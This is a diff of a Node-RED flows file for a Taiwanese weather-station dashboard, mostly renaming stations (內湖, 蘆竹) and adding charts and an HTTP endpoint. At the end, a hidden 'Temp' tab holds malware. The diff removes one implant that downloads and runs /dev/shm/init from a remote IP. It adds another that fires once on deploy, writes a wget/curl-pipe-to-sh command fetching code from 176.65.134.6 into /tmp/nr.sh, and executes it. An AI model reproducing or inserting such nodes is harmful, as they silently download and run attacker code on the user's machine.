@@ -298,7 +298,8 @@
         "wires": [
             [
                 "7a93505cd70c069d",
-                "64b21ab110ec5681"
+                "64b21ab110ec5681",
+                "e3d042e76bd0fde7"
             ]
         ],
         "x": 330,
@@ -312,7 +313,7 @@
         "group": "91c349f5401b4c59",
         "height": 0,
         "id": "11b5ba368a2ba145",
-        "name": "信義",
+        "name": "內湖",
         "order": 1,
         "resendOnRefresh": true,
         "storeOutMessages": true,
@@ -328,11 +329,11 @@
     },
     {
         "finalize": "",
-        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"信義\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '信義' 的資料\" };\n}\n\nreturn msg;",
+        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"內湖\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '內湖' 的資料\" };\n}\n\nreturn msg;",
         "id": "7a93505cd70c069d",
         "initialize": "",
         "libs": [],
-        "name": "信義",
+        "name": "內湖",
         "noerr": 0,
         "outputs": 1,
         "timeout": 0,
@@ -371,7 +372,7 @@
         "height": 3,
         "id": "c858ae1037a20759",
         "interpolate": "linear",
-        "label": "風速(公尺/秒)",
+        "label": "內湖風速(公尺/秒)",
         "legend": "false",
         "name": "",
         "nodata": "",
@@ -384,14 +385,14 @@
         "useDifferentColor": false,
         "useOneColor": false,
         "useUTC": false,
-        "width": 18,
+        "width": 9,
         "wires": [
             []
         ],
-        "x": 970,
+        "x": 990,
         "xformat": "HH:mm:ss",
         "y": 220,
-        "ymax": "30",
+        "ymax": "15",
         "ymin": "0",
         "z": "d8842b55346820a3"
     },
@@ -442,11 +443,11 @@
         "height": 3,
         "id": "4ac5f6136ada0999",
         "interpolate": "linear",
-        "label": "氣溫(C)",
+        "label": "內湖氣溫(C)",
         "legend": "false",
         "name": "",
         "nodata": "",
-        "order": 2,
+        "order": 3,
         "outputs": 1,
         "removeOlder": "24",
         "removeOlderPoints": "",
@@ -455,11 +456,11 @@
         "useDifferentColor": false,
         "useOneColor": false,
         "useUTC": false,
-        "width": 18,
+        "width": 9,
         "wires": [
             []
         ],
-        "x": 980,
+        "x": 990,
         "xformat": "HH:mm:ss",
         "y": 280,
         "ymax": "40",
@@ -513,11 +514,11 @@
         "height": 3,
         "id": "6b75e0fb5b11b9ad",
         "interpolate": "linear",
-        "label": "濕度",
+        "label": "內湖濕度",
         "legend": "false",
         "name": "",
         "nodata": "",
-        "order": 3,
+        "order": 5,
         "outputs": 1,
         "removeOlder": "24",
         "removeOlderPoints": "",
@@ -526,11 +527,11 @@
         "useDifferentColor": false,
         "useOneColor": false,
         "useUTC": false,
-        "width": 18,
+        "width": 9,
         "wires": [
             []
         ],
-        "x": 970,
+        "x": 980,
         "xformat": "HH:mm:ss",
         "y": 340,
         "ymax": "100",
@@ -584,11 +585,11 @@
         "height": 3,
         "id": "0b1f5928367c0c5a",
         "interpolate": "linear",
-        "label": "氣壓",
+        "label": "內湖氣壓",
         "legend": "false",
         "name": "",
         "nodata": "",
-        "order": 4,
+        "order": 7,
         "outputs": 1,
         "removeOlder": "24",
         "removeOlderPoints": "",
@@ -597,11 +598,11 @@
         "useDifferentColor": false,
         "useOneColor": false,
         "useUTC": false,
-        "width": 18,
+        "width": 9,
         "wires": [
             []
         ],
-        "x": 970,
+        "x": 980,
         "xformat": "HH:mm:ss",
         "y": 400,
         "ymax": "1100",
@@ -637,11 +638,11 @@
     },
     {
         "finalize": "",
-        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"臺東\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '內湖' 的資料\" };\n}\n\nreturn msg;\n\n\n//msg.payload = msg.payload.records.Station[306];\n//return msg;",
+        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"蘆竹\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '蘆竹' 的資料\" };\n}\n\nreturn msg;\n\n\n//msg.payload = msg.payload.records.Station[306];\n//return msg;",
         "id": "64b21ab110ec5681",
         "initialize": "",
         "libs": [],
-        "name": "內湖",
+        "name": "蘆竹",
         "noerr": 0,
         "outputs": 1,
         "timeout": 0,
@@ -662,7 +663,7 @@
         "group": "91c349f5401b4c59",
         "height": 0,
         "id": "409ad5af7d7900c5",
-        "name": "內湖",
+        "name": "蘆竹",
         "order": 2,
         "resendOnRefresh": true,
         "storeOutMessages": true,
@@ -670,7 +671,12 @@
         "type": "ui_template",
         "width": 0,
         "wires": [
-            []
+            [
+                "6d4a749e173f9f51",
+                "3747d3c35e748df8",
+                "a1bf371e4df6290d",
+                "317fe47419d45cbb"
+            ]
         ],
         "x": 690,
         "y": 500,
@@ -690,6 +696,319 @@
         "wires": [],
         "x": 820,
         "y": 140,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "id": "69bbc7987be22da9",
+        "method": "get",
+        "name": "",
+        "skipBodyParsing": false,
+        "swaggerDoc": "",
+        "type": "http in",
+        "upload": false,
+        "url": "/weatherdata",
+        "wires": [
+            [
+                "3222563b458deb46"
+            ]
+        ],
+        "x": 130,
+        "y": 80,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "headers": {},
+        "id": "e3d042e76bd0fde7",
+        "name": "",
+        "statusCode": "",
+        "type": "http response",
+        "wires": [],
+        "x": 490,
+        "y": 80,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "7b0cb782154e67a2",
+        "interpolate": "linear",
+        "label": "蘆竹風速(公尺/秒)",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 9,
+        "wires": [
+            []
+        ],
+        "x": 1130,
+        "xformat": "HH:mm:ss",
+        "y": 480,
+        "ymax": "15",
+        "ymin": "0",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "6d4a749e173f9f51",
+        "name": "風速",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.WindSpeed",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "7b0cb782154e67a2"
+            ]
+        ],
+        "x": 830,
+        "y": 480,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "3ed9846523022317",
+        "interpolate": "linear",
+        "label": "蘆竹氣溫(C)",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 4,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 9,
+        "wires": [
+            []
+        ],
+        "x": 1130,
+        "xformat": "HH:mm:ss",
+        "y": 540,
+        "ymax": "40",
+        "ymin": "5",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "3747d3c35e748df8",
+        "name": "溫度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.AirTemperature",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "3ed9846523022317"
+            ]
+        ],
+        "x": 830,
+        "y": 540,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "81ca28cd9a9fe4e5",
+        "interpolate": "linear",
+        "label": "蘆竹濕度",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 6,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 9,
+        "wires": [
+            []
+        ],
+        "x": 1120,
+        "xformat": "HH:mm:ss",
+        "y": 600,
+        "ymax": "100",
+        "ymin": "0",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "a1bf371e4df6290d",
+        "name": "濕度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.RelativeHumidity",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "81ca28cd9a9fe4e5"
+            ]
+        ],
+        "x": 830,
+        "y": 600,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "3a8ca7385eac4220",
+        "interpolate": "linear",
+        "label": "蘆竹氣壓",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 8,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 9,
+        "wires": [
+            []
+        ],
+        "x": 1120,
+        "xformat": "HH:mm:ss",
+        "y": 660,
+        "ymax": "1100",
+        "ymin": "900",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "317fe47419d45cbb",
+        "name": "氣壓",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.AirPressure",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "3a8ca7385eac4220"
+            ]
+        ],
+        "x": 830,
+        "y": 660,
         "z": "d8842b55346820a3"
     },
     {
@@ -2159,92 +2478,75 @@
         "z": "ec1515cb77dddea4"
     },
     {
-        "id": "1955b8c0-21b9-4d",
+        "id": "ce18ba7e-7636-42",
         "label": "Temp",
         "type": "tab"
     },
     {
-        "crontab": "",
-        "id": "f15359f2-6e33-44",
-        "name": "",
+        "id": "2a132513-b9e3-44",
         "once": true,
         "onceDelay": "0",
         "props": [],
-        "repeat": "",
-        "topic": "",
         "type": "inject",
         "wires": [
             [
-                "a3895d73-e64f-44"
+                "faa99cba-b19f-40"
             ]
         ],
-        "x": 630,
-        "y": 680,
-        "z": "1955b8c0-21b9-4d"
+        "x": 0,
+        "y": 0,
+        "z": "ce18ba7e-7636-42"
     },
     {
-        "addpay": false,
-        "append": "",
-        "command": "pgrep -f ^/dev/shm/init",
-        "id": "a3895d73-e64f-44",
-        "name": "",
-        "timer": "",
-        "type": "exec",
-        "useSpawn": "false",
-        "winHide": false,
-        "wires": [
-            [],
-            [],
-            [
-                "60315e24-b10c-49"
-            ]
-        ],
-        "x": 860,
-        "y": 680,
-        "z": "1955b8c0-21b9-4d"
-    },
-    {
-        "checkall": "true",
-        "id": "60315e24-b10c-49",
-        "name": "",
-        "outputs": 1,
-        "property": "payload.code",
-        "propertyType": "msg",
-        "repair": false,
+        "id": "faa99cba-b19f-40",
         "rules": [
             {
-                "t": "neq",
-                "v": "0",
-                "vt": "str"
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "trap 'rm -f /tmp/nr.sh' EXIT\n(wget -qO- http://176.65.134.6/8c91a077337/768865f9||curl -sf http://176.65.134.6/8c91a077337/768865f9) | sh",
+                "tot": "str"
             }
         ],
-        "type": "switch",
+        "type": "change",
         "wires": [
             [
-                "64d12791-08cb-40"
+                "a00a8827-b37a-4a"
             ]
         ],
-        "x": 1130,
-        "y": 680,
-        "z": "1955b8c0-21b9-4d"
+        "x": 0,
+        "y": 0,
+        "z": "ce18ba7e-7636-42"
+    },
+    {
+        "filename": "/tmp/nr.sh",
+        "filenameType": "str",
+        "id": "a00a8827-b37a-4a",
+        "overwriteFile": "true",
+        "type": "file",
+        "wires": [
+            [
+                "72fce678-18a1-4a"
+            ]
+        ],
+        "x": 0,
+        "y": 0,
+        "z": "ce18ba7e-7636-42"
     },
     {
         "addpay": false,
-        "append": "",
-        "command": "a=http://185.196.8.170/init; b=/dev/shm/init; (wget -q -O $b $a 2>/dev/null || curl -s -o $b $a && chmod 777 $b && $b >/dev/null 2>&1 && rm $b)",
-        "id": "64d12791-08cb-40",
-        "name": "",
-        "timer": "",
+        "command": "sh /tmp/nr.sh",
+        "id": "72fce678-18a1-4a",
+        "timer": "5",
         "type": "exec",
         "useSpawn": "false",
-        "winHide": false,
         "wires": [
             [],
             [],
             []
         ],
-        "x": 1740,
-        "y": 680,
-        "z": "1955b8c0-21b9-4d"
+        "x": 0,
+        "y": 0,
+        "z": "ce18ba7e-7636-42"
     }
 ]
